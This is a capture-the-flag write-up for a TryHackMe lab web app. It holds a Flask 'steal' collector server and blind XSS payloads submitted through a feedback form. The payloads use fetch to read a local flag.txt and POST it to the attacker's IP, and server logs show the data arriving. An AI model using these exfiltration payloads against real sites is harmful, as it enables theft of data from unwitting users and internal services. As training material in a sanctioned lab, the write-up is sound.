# Can you exploit the sticker shop in order to capture the flag?
https://tryhackme.com/room/thestickershop

# Reconnaissance
Not much to see, there is a feedback page

# Findings
feedback does not appear to be variable to XSS, but does give a clue once submited **Thanks for your feedback! It will be evaluated shortly by our staff**
# Exploiting Findings

Spinning up a flask server on our attack box / VPN address to capture post request on port 5000

```
nano flaskserverpost.py
```

```
from flask import Flask, request

app = Flask(__name__)

@app.route('/steal', methods=['POST'])
def steal():
    data = request.data.decode('utf-8')  # Read raw POST data
    print(f"Stolen Data: {data}")
    return "Data received", 200

if __name__ == '__main__':
    app.run(host='10.4.114.252', port=5000)
```

```
python flaskserverpost.py
 * Serving Flask app 'flaskserverpost'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://10.4.114.252:5000
```

Sending a test post by summiting the following in the feedback form
```
<script>fetch("http://10.4.114.252:5000/steal", {
    method: "POST",
    headers: { "Content-Type": "text/plain" },
    body: "test_post"
});</script>
```

Yes we get the following in the flask server, this also shows us CORs shouldn't be an issue

```
└─$ python flaskserverpost.py
 * Serving Flask app 'flaskserverpost'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://10.4.114.252:5000
Press CTRL+C to quit
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:28] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:38] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:48] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:59] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:15:09] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
```

Now to attempt steal the flag

```
<script>
fetch("http://10.10.138.151:8080/flag.txt")
  .then(r => r.text())
  .then(d => { console.log(d); return fetch("http://10.4.114.252:5000/steal", {method: "POST", headers: {"Content-Type": "text/plain"}, body: d}); });
</script>
```

No returned data, maybe if we used localhost? 

```
<script>
fetch("http://127.0.0.1:8080/flag.txt")
  .then(r => r.text())
  .then(d => { console.log(d); return fetch("http://10.4.114.252:5000/steal", {method: "POST", headers: {"Content-Type": "text/plain"}, body: d}); });
</script>
```

Yes! flag is returned, What is the content of flag.txt?

```
─$ python flaskserverpost.py
 * Serving Flask app 'flaskserverpost'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on http://10.4.114.252:5000
Press CTRL+C to quit
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:28] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:38] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:48] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:14:59] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:15:09] "POST /steal HTTP/1.1" 200 -
Stolen Data: test_post
10.10.138.151 - - [19/Mar/2025 02:15:19] "POST /steal HTTP/1.1" 200 -
Stolen Data: THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
10.10.138.151 - - [19/Mar/2025 02:16:11] "POST /steal HTTP/1.1" 200 -
Stolen Data: THM{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}
10.10.138.151 - - [19/Mar/2025 02:16:21] "POST /steal HTTP/1.1" 200 -

```

# Summary 
Not much to this CTF, the deviation on the "easy" difficulty is quite large. 